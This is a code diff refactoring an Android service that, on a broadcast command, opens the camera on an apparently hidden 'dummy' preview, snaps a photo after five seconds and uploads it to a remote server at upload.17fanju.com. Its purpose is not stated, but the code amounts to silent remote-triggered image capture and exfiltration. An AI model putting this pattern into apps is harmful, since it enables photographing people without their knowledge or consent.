@@ -31,18 +31,17 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 
-public class CameraSnapService extends Service implements Camera.PictureCallback {
+public class CameraSnapService extends Service {
     private static final String TAG = "CameraSnapService";
-    private Camera mCamera;
-    private boolean mCameraIsRunning; // 是否已在监控拍照
-    private CommandReceiver cmdReceiver;
-    private String mUniqueId = "";
+    private Camera mCamera0;
+    private boolean mCamera0IsRunning; // 是否已在监控拍照
+    private String mCamera0UniqueId = "";
 
     @Override
     public void onCreate() {
         LogUtil.d(TAG, "onCreate...");
 
-        cmdReceiver = new CommandReceiver();
+        CommandReceiver cmdReceiver = new CommandReceiver();
         IntentFilter filter = new IntentFilter();
         filter.addAction("android.intent.action.cameraSnapService");
         registerReceiver(cmdReceiver, filter);
@@ -56,58 +55,60 @@ public class CameraSnapService extends Service implements Camera.PictureCallback
         return START_NOT_STICKY;
     }
 
-    private void autoTakePic(SurfaceView preview, int cameraId, String uniqueId) {
+    private void autoTakePic0(SurfaceView preview,String uniqueId) {
         LogUtil.d(TAG, "autoTakePic...");
 
         try {
 
-            if (!mCameraIsRunning) {
-                mCameraIsRunning = true;
-                mUniqueId = uniqueId;
-                mCamera = Camera.open();
-                if (mCamera == null) {
+            if (!mCamera0IsRunning) {
+                mCamera0IsRunning = true;
+                mCamera0UniqueId = uniqueId;
+                mCamera0 = Camera.open(0);
+                if (mCamera0 == null) {
                     LogUtil.w(TAG, "getFacingFrontCamera return null");
-                    releaseCamera();
+                    camera0Release();
                     return;
                 }
-                mCamera.setPreviewDisplay(preview.getHolder());
-                mCamera.startPreview();// 开始预览
+                mCamera0.setPreviewDisplay(preview.getHolder());
+                mCamera0.startPreview();// 开始预览
                 // 防止某些手机拍摄的照片亮度不够
                 Thread.sleep(5000);
-                mCamera.takePicture(null, null, this);
+                mCamera0.takePicture(null, null, new Camera0Callback());
             } else {
                 LogUtil.w(TAG, "Camera running");
             }
         } catch (Exception e) {
             e.printStackTrace();
-            releaseCamera();
+            camera0Release();
         }
     }
 
-    @Override
-    public void onPictureTaken(byte[] data, Camera camera) {
-        LogUtil.d(TAG, "onPictureTaken...");
-        try {
-            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
-            String filePath = getSaveSdCardPath()+"/"+mUniqueId + ".jpg";
-            File file = new File(filePath);
-            FileOutputStream outputStream = new FileOutputStream(file);
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, outputStream);
-            outputStream.close();
-            camera.stopPreview();
+    private final class Camera0Callback implements Camera.PictureCallback {
+        @Override
+        public void onPictureTaken(byte[] data, Camera camera) {
+            LogUtil.d(TAG, "onPictureTaken...");
+            try {
+                Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
+                String filePath = getSaveSdCardPath() + "/" + mCamera0UniqueId + ".jpg";
+                File file = new File(filePath);
+                FileOutputStream outputStream = new FileOutputStream(file);
+                bitmap.compress(Bitmap.CompressFormat.JPEG, 50, outputStream);
+                outputStream.close();
+                camera.stopPreview();
 
-            List<String> filePaths=new ArrayList<>();
-            filePaths.add(filePath);
-            Map<String, String> params = new HashMap<>();
-            params.put("uniqueId",mUniqueId);
-            HttpClient.postFile("http://upload.17fanju.com/api/upload",params,filePaths,null);
+                List<String> filePaths = new ArrayList<>();
+                filePaths.add(filePath);
+                Map<String, String> params = new HashMap<>();
+                params.put("uniqueId", mCamera0UniqueId);
+                HttpClient.postFile("http://upload.17fanju.com/api/upload", params, filePaths, null);
 
-            Log.e(TAG, "拍照结束");
-        } catch (Exception e) {
-            Log.e(TAG, e.toString());
+                Log.e(TAG, "拍照结束");
+            } catch (Exception e) {
+                Log.e(TAG, e.toString());
+            }
+
+            camera0Release();
         }
-
-        releaseCamera();
     }
 
     public String getSaveSdCardPath() {
@@ -126,15 +127,15 @@ public class CameraSnapService extends Service implements Camera.PictureCallback
         return null;
     }
 
-    private void releaseCamera() {
+    private void camera0Release() {
 
-        mUniqueId = "";
-        mCameraIsRunning = false;
-        if (mCamera != null) {
+        mCamera0UniqueId = "";
+        mCamera0IsRunning = false;
+        if (mCamera0 != null) {
             LogUtil.d(TAG, "releaseCamera...");
-            mCamera.stopPreview();
-            mCamera.release();
-            mCamera = null;
+            mCamera0.stopPreview();
+            mCamera0.release();
+            mCamera0 = null;
         }
     }
 
@@ -142,7 +143,7 @@ public class CameraSnapService extends Service implements Camera.PictureCallback
     public void onDestroy() {
         super.onDestroy();
         LogUtil.d(TAG, "onDestroy...");
-        releaseCamera();
+        camera0Release();
     }
 
     @Override
@@ -154,29 +155,12 @@ public class CameraSnapService extends Service implements Camera.PictureCallback
         @Override
         public void onReceive(Context context, final Intent intent) {
             LogUtil.i(TAG, "onReceive");
-
-
             int cameraId = intent.getIntExtra("cameraId", -1);
             String uniqueId = intent.getStringExtra("uniqueId");
-            if (cameraId >= 0 && uniqueId != null) {
+            if (cameraId == 0 && uniqueId != null) {
                 SurfaceView preview = CameraWindow.getDummyCameraView();
-                autoTakePic(preview, cameraId, uniqueId);
+                autoTakePic0(preview, uniqueId);
             }
-
-//            //if ( intent.getAction().equals("android.intent.action.cmdservice") ){
-//            Handler handler = new Handler();
-//            handler.postDelayed(new Runnable() {
-//                @Override
-//                public void run() {
-//
-//                    int cameraId = intent.getIntExtra("cameraId", -1);
-//                    String uniqueId = intent.getStringExtra("uniqueId");
-//                    if (cameraId >= 0 && uniqueId != null) {
-//                        SurfaceView preview = CameraWindow.getDummyCameraView();
-//                        autoTakePic(preview, cameraId, uniqueId);
-//                    }
-//                }
-//            }, 1000);//3秒后执行Runnable中的run方法
         }
     }
 }
